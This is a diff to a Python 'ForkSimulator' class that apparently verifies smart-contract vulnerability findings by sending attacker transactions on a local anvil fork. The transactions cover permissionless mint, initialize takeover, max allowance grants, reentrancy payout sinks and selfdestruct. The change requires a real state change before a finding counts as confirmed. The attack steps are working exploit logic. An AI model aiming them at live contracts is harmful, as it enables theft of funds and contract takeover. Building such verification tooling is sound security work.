@@ -578,6 +578,22 @@ class ForkSimulator:
             capture_output=True, text=True, timeout=30)
         return proc.stdout.strip() or proc.stderr.strip()
 
+    @staticmethod
+    def _to_int(value) -> Optional[int]:
+        """Parse a wei/uint value from cast output.
+
+        `cast balance` prints DECIMAL wei; `cast call` prints HEX. A read
+        failure (empty/error string) must NOT be treated as zero — return
+        None so the caller fails closed instead of proving a false change.
+        """
+        try:
+            s = str(value or "").strip() or "0"
+            if s.lower().startswith("0x"):
+                return int(s, 16)
+            return int(s)
+        except (ValueError, TypeError):
+            return None
+
     def _send(self, selector: str, args: List[str]) -> Dict:
         """A REAL state-changing tx from the attacker account (fork-local).
 
@@ -792,10 +808,16 @@ class ForkSimulator:
         ABI when provided (real signatures, real input types — no guessing).
 
         Returns a result dict with a `verdict`:
-          CONFIRMED   — a state-changing tx from an arbitrary account mined
-                        (or an eth_call returned) and evidence shows effect
+          CONFIRMED   — a tx from an arbitrary account mined AND the
+                        evidence shows a REAL state change (ETH moved,
+                        balanceOf changed, owner switched to the attacker,
+                        allowance granted). A mined tx that moved no state
+                        (e.g. empty withdraw() landing in a payable
+                        fallback that does nothing — WETH) is REFUTED,
+                        not CONFIRMED.
           REFUTED     — the ABI says the function exists but every call
-                        reverted (or the target has no code) → NOT callable
+                        reverted (or the target has no code, or every
+                        mined call was a state-less no-op) → NOT callable
           UNVERIFIED  — could not prove either way (no ABI, no matching
                         function, or the fork never came up)
         """
@@ -846,12 +868,14 @@ class ForkSimulator:
     def _run_impl(self, attack: str, target: str, source_finding: Optional[Dict] = None) -> Dict:
         """Prove the finding on a real anvil fork.
 
-        mint / initialize get the full state-changing proof: the attacker is
-        funded on the fork, the tx actually executes, and the resulting state
-        (balanceOf / owner) is read back as evidence. delegatecall is proven
-        via eth_call (an actual upgrade would clobber fork state for later
-        checks). A non-reverting call/tx = the function is callable by anyone
-        = the static finding is a live surface.
+        mint / initialize / approve / reentrancy get the full state-diff
+        proof: the attacker is funded on the fork, the tx actually executes,
+        and the resulting state (balanceOf / owner / allowance / ETH moved)
+        is read back as evidence. CONFIRMED requires that state to have
+        CHANGED — a mined tx that moved nothing (empty calldata hitting a
+        payable fallback, a by-design self-withdraw of a zero balance) is
+        a no-op, REFUTED. delegatecall is proven via eth_call (an actual
+        upgrade would clobber fork state for later checks).
         """
         if not self.available:
             return {"success": False, "error": self.why_not, "attack": attack,
@@ -874,7 +898,7 @@ class ForkSimulator:
         if attack == "mint":
             # state-diff: read attacker balance BEFORE the tx, then after
             br0 = self._call("balanceOf(address)", [self.attacker], extra_from=False)
-            before = br0["stdout"] or "0"
+            before = self._to_int(br0["stdout"])
             tried = []
             for sel, args in self._merge_candidates(
                     [("mint(address,uint256)", [self.attacker, "1000000"])]):
@@ -882,20 +906,28 @@ class ForkSimulator:
                 tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                 if r["ok"]:
                     br = self._call("balanceOf(address)", [self.attacker], extra_from=False)
-                    bal = br["stdout"]
+                    bal = self._to_int(br["stdout"])
                     steps.append({"step": sel + " sent from arbitrary account",
                                   "value": "tx mined ✅"})
-                    steps.append({"step": f"balanceOf({self.attacker[:10]}…) before → after",
-                                  "value": f"{before} → {bal or 'read failed'}"})
-                    return {"success": True, "attack": attack, "target": target,
-                            "profit": "Unlimited token supply minted for free",
-                            "steps": steps,
-                            "evidence": f"balanceOf(attacker) {before} → {bal or 'n/a'}",
-                            "source_finding": source_finding}
+                    if before is not None and bal is not None and bal != before:
+                        steps.append({"step": f"balanceOf({self.attacker[:10]}…) before → after",
+                                      "value": f"{before} → {bal}"})
+                        return {"success": True, "attack": attack, "target": target,
+                                "profit": "Unlimited token supply minted for free",
+                                "steps": steps,
+                                "evidence": f"balanceOf(attacker) {before} → {bal}",
+                                "source_finding": source_finding}
+                    steps.append({"step": "balanceOf(attacker) before → after",
+                                  "value": f"{before or 'read failed'} → "
+                                           f"{bal or 'read failed'} — NO CHANGE, no-op"})
             steps.append({"step": "mint selectors tried", "value": "; ".join(tried)})
             return {"success": False, "attack": attack, "target": target,
-                    "steps": steps, "evidence": r["stderr"][:200] if r else "no mint() found",
-                    "source_finding": source_finding}
+                    "steps": steps,
+                    "evidence": ("No permissionless mint that credits the caller found "
+                                 "(all mint() variants reverted or mined without "
+                                 "changing balanceOf)."),
+                    "source_finding": source_finding,
+                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}
 
         if attack == "initialize":
             owner_before = self._read("owner()")
@@ -906,24 +938,31 @@ class ForkSimulator:
                 r = self._send(sel, args)
                 tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                 if r["ok"]:
-                    steps.append({"step": sel + " sent from arbitrary account",
-                                  "value": "tx mined — not yet initialized!"})
                     owner = self._read("owner()")
-                    steps.append({"step": "owner() before → after",
-                                  "value": f"{owner_before or 'n/a'} → {owner}"})
                     norm = lambda h: h.lower().replace("0x", "").lstrip("0")
                     owned = norm(owner) == norm(self.attacker)
-                    return {"success": True, "attack": attack, "target": target,
-                            "profit": "Full contract takeover (first-caller becomes owner)",
-                            "steps": steps,
-                            "evidence": (f"owner() {owner_before or 'n/a'} → {owner} "
-                                         f"(attacker {'IS' if owned else 'NOT'} owner)"),
-                            "source_finding": source_finding}
+                    steps.append({"step": sel + " sent from arbitrary account",
+                                  "value": "tx mined"})
+                    if owned:
+                        steps.append({"step": "owner() before → after",
+                                      "value": f"{owner_before or 'n/a'} → {owner} — attacker IS owner"})
+                        return {"success": True, "attack": attack, "target": target,
+                                "profit": "Full contract takeover (first-caller becomes owner)",
+                                "steps": steps,
+                                "evidence": (f"owner() {owner_before or 'n/a'} → {owner} "
+                                             f"(attacker IS owner)"),
+                                "source_finding": source_finding}
+                    steps.append({"step": "owner() before → after",
+                                  "value": f"{owner_before or 'n/a'} → {owner or 'read failed'} "
+                                           f"— NOT the attacker, no takeover"})
             steps.append({"step": "initialize() attempts", "value": "; ".join(tried)})
             return {"success": False, "attack": attack, "target": target,
                     "steps": steps,
-                    "evidence": "All initialize() variants reverted (likely guarded/already initialized).",
-                    "source_finding": source_finding}
+                    "evidence": ("initialize() not exploitable: all variants reverted "
+                                 "(guarded/already initialized) or did not grant the "
+                                 "attacker ownership."),
+                    "source_finding": source_finding,
+                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}
 
         if attack == "delegatecall":
             # Permissionless proxy upgrade = arbitrary delegatecall.
@@ -948,12 +987,23 @@ class ForkSimulator:
             return {"success": False, "attack": attack, "target": target,
                     "steps": steps,
                     "evidence": "No permissionless proxy-upgrade selector found.",
-                    "source_finding": source_finding}
+                    "source_finding": source_finding,
+                    **({"verdict": "REFUTED"} if any("returned" in t for t in tried) else {})}
 
         if attack == "reentrancy":
             # A payout sink callable by anyone = an open reentrancy window
             # (The DAO 2016 pattern): ETH leaves the contract before state
             # settles, so a callback can re-enter and double-withdraw.
+            #
+            # CONFIRMED only on a REAL state change: the target's ETH
+            # balance drops (money actually left the contract) or the
+            # attacker's ETH balance exceeds the 2 ETH seed (a payout
+            # landed, net of gas). _send re-funds the attacker to exactly
+            # 2 ETH each call, so > 2e18 is a self-baselining payout signal.
+            # A mined tx with no balance movement (e.g. an empty withdraw()
+            # landing in a payable fallback that does nothing — WETH) is a
+            # no-op and is REFUTED, NOT a payout sink.
+            fund_seed = 2 * 10 ** 18  # matches _fund_attacker's 2 ETH
             tried = []
             for sel, args in self._merge_candidates(
                     [("withdraw(uint256)", ["1000"]),
@@ -964,22 +1014,41 @@ class ForkSimulator:
                      ("harvest()", []),
                      ("withdrawAll()", []),
                      ("emergencyWithdraw()", [])]):
+                target_before = self._to_int(self._balance(self._target))
                 r = self._send(sel, args)
                 tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
-                if r["ok"]:
+                if not r["ok"]:
+                    continue
+                target_after = self._to_int(self._balance(self._target))
+                attacker_after = self._to_int(self._balance(self.attacker))
+                moved = (target_before is not None and target_after is not None
+                         and target_after < target_before)
+                payout = attacker_after is not None and attacker_after > fund_seed
+                if moved or payout:
                     steps.append({"step": sel + " sent from arbitrary account",
                                   "value": "mined — payout sink callable by anyone"})
+                    steps.append({"step": "target ETH before → after",
+                                  "value": f"{target_before} → {target_after}"})
+                    steps.append({"step": "attacker ETH after",
+                                  "value": f"{attacker_after} (payout {'received' if payout else 'n/a'})"})
                     return {"success": True, "attack": attack, "target": target,
                             "profit": "Reentrancy window: payout sends ETH before state settles",
                             "steps": steps,
-                            "evidence": f"{sel} callable by arbitrary account",
+                            "evidence": (f"{sel} mined and moved ETH: target "
+                                         f"{target_before} → {target_after}, "
+                                         f"attacker {attacker_after}"),
                             "source_finding": source_finding}
+                steps.append({"step": sel + " mined but no state change",
+                              "value": ("no ETH moved — no-op / payable fallback hit, "
+                                        "NOT a payout sink")})
             steps.append({"step": "payout selectors", "value": "; ".join(tried)})
             return {"success": False, "attack": attack, "target": target,
                     "steps": steps,
                     "evidence": ("No permissionless payout sink found "
-                                 "(withdraw/claim/redeem/unstake/harvest)."),
-                    "source_finding": source_finding}
+                                 "(withdraw/claim/redeem/unstake/harvest mined "
+                                 "without moving ETH)."),
+                    "source_finding": source_finding,
+                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}
 
         if attack == "arbitrarycall":
             # A forwarder callable by anyone with attacker-supplied calldata =
@@ -1009,13 +1078,17 @@ class ForkSimulator:
             return {"success": False, "attack": attack, "target": target,
                     "steps": steps,
                     "evidence": "No permissionless calldata forwarder found.",
-                    "source_finding": source_finding}
+                    "source_finding": source_finding,
+                    **({"verdict": "REFUTED"} if any("returned" in t for t in tried) else {})}
 
         if attack == "approve":
             # Attacker granting itself spending allowance over the target =
             # the primitive behind ERC20 drains: once allowance
             # (target → attacker) > 0, transferFrom can move the target's
             # entire balance in one tx.
+            # CONFIRMED only when the mined tx actually granted an
+            # allowance/isApprovedForAll — a mined no-op (approve() landing
+            # in a payable fallback) that leaves allowance at 0 is REFUTED.
             max_allow = "115792089237316195423570985008687907853269984665640564039457584007913129639935"
             tried = []
             for sel, args in self._merge_candidates(
@@ -1023,23 +1096,37 @@ class ForkSimulator:
                      ("setApprovalForAll(address,bool)", [self.attacker, "true"])]):
                 r = self._send(sel, args)
                 tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
-                if r["ok"]:
-                    allow = self._call("allowance(address,address)",
-                                       [self._target, self.attacker], extra_from=False)
-                    steps.append({"step": sel + " from arbitrary account",
-                                  "value": "mined — allowance granted"})
-                    steps.append({"step": "allowance(target → attacker) after",
-                                  "value": allow["stdout"] or "read failed"})
+                if not r["ok"]:
+                    continue
+                if "setApprovalForAll" in sel:
+                    chk = self._call("isApprovedForAll(address,address)",
+                                     [self._target, self.attacker], extra_from=False)
+                    granted = chk["ok"] and chk["stdout"].strip().lower() in ("true", "0x01", "1")
+                    label = "isApprovedForAll(target→attacker)"
+                else:
+                    chk = self._call("allowance(address,address)",
+                                     [self._target, self.attacker], extra_from=False)
+                    granted = (self._to_int(chk["stdout"]) or 0) > 0
+                    label = "allowance(target→attacker)"
+                steps.append({"step": sel + " from arbitrary account",
+                              "value": "mined"})
+                steps.append({"step": f"{label} after",
+                              "value": chk["stdout"] or "read failed"})
+                if granted:
                     return {"success": True, "attack": attack, "target": target,
                             "profit": "Attacker granted itself spending allowance over the target",
                             "steps": steps,
                             "evidence": "allowance(target→attacker) > 0",
                             "source_finding": source_finding}
+                steps.append({"step": f"{label} still 0",
+                              "value": "mined but no approval granted — no-op"})
             steps.append({"step": "approval selectors", "value": "; ".join(tried)})
             return {"success": False, "attack": attack, "target": target,
                     "steps": steps,
-                    "evidence": "No permissionless approve()/setApprovalForAll() found.",
-                    "source_finding": source_finding}
+                    "evidence": ("No permissionless approve()/setApprovalForAll() found "
+                                 "(all reverted or mined without granting an allowance)."),
+                    "source_finding": source_finding,
+                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}
 
         if attack == "selfdestruct":
             before = self._balance(self._target)
@@ -1057,23 +1144,28 @@ class ForkSimulator:
                 if r["ok"]:
                     gone = not self._has_code()
                     after = self._balance(self._target)
+                    state_changed = gone or after != before
                     steps.append({"step": sel + " from arbitrary account",
                                   "value": "mined ✅"})
-                    steps.append({"step": "code after",
-                                  "value": ("removed" if gone else
-                                            "still present (EIP-6780: balance transferred)" )})
-                    steps.append({"step": "target ETH before → after",
-                                  "value": f"{before} → {after}"})
-                    return {"success": True, "attack": attack, "target": target,
-                            "profit": "Kill switch: contract balance transferred / code destroyed",
-                            "steps": steps,
-                            "evidence": f"{sel} mined — ETH {before} → {after}",
-                            "source_finding": source_finding}
+                    if state_changed:
+                        steps.append({"step": "code after",
+                                      "value": ("removed" if gone else
+                                                "still present (EIP-6780: balance transferred)" )})
+                        steps.append({"step": "target ETH before → after",
+                                      "value": f"{before} → {after}"})
+                        return {"success": True, "attack": attack, "target": target,
+                                "profit": "Kill switch: contract balance transferred / code destroyed",
+                                "steps": steps,
+                                "evidence": f"{sel} mined — ETH {before} → {after}",
+                                "source_finding": source_finding}
+                    steps.append({"step": sel + " mined but no state change",
+                                  "value": "code present, ETH unchanged — no-op, NOT a kill switch"})
             steps.append({"step": "kill selectors", "value": "; ".join(tried)})
             return {"success": False, "attack": attack, "target": target,
                     "steps": steps,
                     "evidence": "No permissionless selfdestruct/kill selector found.",
-                    "source_finding": source_finding}
+                    "source_finding": source_finding,
+                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}
 
         return {"success": False, "attack": attack, "target": target,
                 "error": f"ForkSimulator does not support attack '{attack}'",
